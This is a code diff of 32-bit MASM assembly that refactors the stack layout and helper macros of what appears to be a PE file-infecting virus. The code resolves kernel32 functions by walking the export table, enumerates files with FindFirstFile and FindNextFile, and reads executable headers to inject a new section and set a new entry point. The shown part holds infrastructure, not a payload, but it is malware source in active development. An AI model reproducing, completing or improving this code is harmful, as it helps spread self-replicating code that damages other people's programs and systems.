@@ -7,51 +7,51 @@ option casemap: none
 ; .const
 	; Order of each variable IN THE STACK
 	; Position relative to r|ebp calculated by -(Order * regSz)
-    selfName EQU 11
-	selfImageBaseAddress EQU 1
-	selfSection EQU 2
-	selfEntry EQU 3
-	selfHand EQU 4
-	selfVirtualSize EQU 5
-	selfPointerToRawData EQU 5
+    selfName EQU 1
+	selfImageBaseAddress EQU 2
+	selfSection EQU 3
+	selfEntry EQU 4
+	selfHand EQU 5
+	selfVirtualSize EQU 6
+	selfPointerToRawData EQU 7
 	
-	tgHand EQU 5
-	tgNewEntry EQU 4
-	lfanew EQU 5
-	NumberOfSections EQU 6 ; Before injection
-	SizeOfOptionalHeader EQU 7
-	ioh_offset EQU 8
-	Magic EQU 9 ; 10Bh => 32=bit; 20Bh => 64-bit
-	AddressOfEntryPoint EQU 10
-	SectionAlignment EQU 11
-	FileAlignment EQU 12
-	lastish_offset EQU 14
-	newish_offset EQU 17
+	tgHand EQU 8
+	tgNewEntry EQU 9
+	lfanew EQU 10
+	NumberOfSections EQU 11 ; Before injection
+	SizeOfOptionalHeader EQU 12
+	ioh_offset EQU 13
+	Magic EQU 14 ; 10Bh => 32=bit; 20Bh => 64-bit
+	AddressOfEntryPoint EQU 15
+	SectionAlignment EQU 16
+	FileAlignment EQU 17
+	lastish_offset EQU 18
+	newish_offset EQU 19
 	
-	
-    kernel32dll EQU 5
-    OrdinalTbl EQU 6
-    NamePtrTbl EQU 7
-    AddrTbl EQU 8
-    k32NumFunc EQU 9
-    user32dll EQU 10
+    kernel32dll EQU 20
+    OrdinalTbl EQU 21
+    NamePtrTbl EQU 22
+    AddrTbl EQU 23
+    k32NumFunc EQU 24
+    user32dll EQU 25
     
-	fileHand EQU 4 ; From FindFirstFile, for FindNextFile
-    ffind1 EQU 12 		; FindFirstFileA
-    ffind2 EQU 13 		; FindNextFileA
-    ffind0 EQU 14 		; FindClose
-    fopen EQU 11 		; CreateFileA
-    fseek EQU 17 		; SetFilePointer(Ex)
-    fclose EQU 14 		; CloseHandle
-    fread EQU 15 		; ReadFile
-    fwrite EQU 16 		; WriteFile
-    argv0 EQU 17
-    loadlib EQU 17 		; LoadLibraryA
-    getaddr EQU 18 		; GetProcAddress
-    msgbox EQU 19 		; MessageBoxA
+	fileHand EQU 26 ; From FindFirstFile, for FindNextFile
+    ffind1 EQU 27 		; FindFirstFileA
+    ffind2 EQU 28 		; FindNextFileA
+    ffind0 EQU 29 		; FindClose
+    fopen EQU 30 		; CreateFileA
+    fseek EQU 31 		; SetFilePointer(Ex)
+    fclose EQU 32 		; CloseHandle
+    fread EQU 33 		; ReadFile
+    fwrite EQU 34 		; WriteFile
+    argv0 EQU 35
+    ferror EQU 36		; GetLastError
+    loadlib EQU 37 		; LoadLibraryA
+    getaddr EQU 38 		; GetProcAddress
+    msgbox EQU 39 		; MessageBoxA
     
     ; Other constants for readability
-    stack_reserved EQU 10 ; Number of values to be stored in the stack
+    stack_reserved EQU 39 ; Number of values to be stored in the stack
     regSz EQU 4 ; 8 for 64-bit
     
     SEEK_SET EQU 0
@@ -72,21 +72,30 @@ fromStack MACRO pos:REQ
 	EXITM <[ebp + stackAddr(pos)]>
 ENDM
 
-; MACRO for accessing data regions
-; selfSection required
-daccess MACRO pStr:REQ
-	LOCAL address
-	address = pStr - data_start + fromStack(selfSection)
-	EXITM <address>
+vfromStack MACRO pos:REQ
+	EXITM <DWORD PTR [ebp + stackAddr(pos)]>
 ENDM
 
-; Accessing values in data regions
-vaccess MACRO pStr:REQ
-	EXITM <DWORD PTR [daccess(pStr)]>
+
+; MACRO for accessing data regions
+; selfSection required
+; reg is used as a temporary intermediate => has to be unused
+; Should NOT be used multiple times within another macro/instruction (e.g. invoke)
+daccess MACRO pStr:REQ, reg:=<eax>
+	mov reg, pStr - data_start
+	add reg, fromStack(selfSection)
+	EXITM <reg>
+ENDM
+
+; Accessing values in data regions/pointer to data regions
+paccess MACRO pStr:REQ, reg:=<eax>
+	EXITM <DWORD PTR [daccess(pStr, reg)]>
 ENDM
 
 k32import MACRO pFunc:REQ
 	; Input the offset to a string that is the name of the queried function
+	LOCAL loopback, found
+	
 	mov ebx, fromStack(kernel32dll)
 	mov edx, fromStack(k32NumFunc)
 	xor eax, eax
@@ -95,11 +104,10 @@ k32import MACRO pFunc:REQ
 		mov edi, fromStack(NamePtrTbl)
 		mov edi, [edi + eax*4]
 		add edi, ebx
-		mov esi, daccess(pFunc)
-		cld ; DF = 0, ESI and EDI increments
+		mov esi, daccess(pFunc, esi)
 		xor ecx, ecx
-		add ecx, len(pFunc)
-		cld
+		add ecx, LENGTHOF pFunc
+		cld ; DF = 0, ESI and EDI increments
 		repe cmpsb
 	jz found
 	
@@ -119,27 +127,23 @@ k32import MACRO pFunc:REQ
 	; eax now hold mem addr of function pointed to by pFunc
 ENDM
 	
-getval MACRO handle:REQ, length:REQ, whence:=<SEEK_CUR>, disp:=<0>
+getval MACRO handle:REQ, length:REQ, whence:=<SEEK_CUR>, disp:=<0>, reg:=<eax>
 	; handle MUST be obtained from stack beforehand
 	; length should not be greater than 4 (32-bit)
-;	LOCAL storage
-;	IF length EQ 1
-;		storage = daccess(offset tempByte)
-;	ELSEIF length EQ 2
-;		storage = daccess(offset tempWord)
-;	ELSE
-;		storage = daccess(offset tempDword)
-;	ENDIF
-	mov daccess(offset tempDword), 0
+	mov paccess(offset tempDword, reg), 0
 	
-	invoke fromStack(fseek), handle, disp, 0, whence
+	push whence
+	push 0
+	push disp
+	push handle
+	call vfromStack(fseek)
 	
 	push 0
-	push daccess(offset tempDword2)
+	push daccess(offset tempDword2, reg)
 	push length
-	push daccess(offset tempDword)
+	push daccess(offset tempDword, reg)
 	push handle
-	call fromStack(fread)
+	call vfromStack(fread)
 	; Retrieved value is stored in tempDword
 ENDM
 
